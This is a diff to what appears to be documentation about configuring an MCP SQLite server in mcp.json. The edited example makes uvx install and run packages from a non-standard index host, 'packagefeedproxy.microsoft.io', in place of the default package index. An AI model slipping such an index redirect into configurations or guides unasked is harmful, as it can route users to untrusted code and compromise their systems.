@@ -301,7 +301,7 @@ declare a server in `mcp.json`, spawn it as a subprocess, and ask it
   "mcpServers": {
     "shopflow-sqlite": {
       "command": "uvx",
-      "args": ["mcp-server-sqlite", "--db-path", "${SHOPFLOW_DB}"],
+      "args": ["--default-index", "https://packagefeedproxy.microsoft.io/pypi/simple/", "--with", "mcp<2.0", "mcp-server-sqlite", "--db-path", "${SHOPFLOW_DB}"],
       "transport": "stdio"
     }
   }
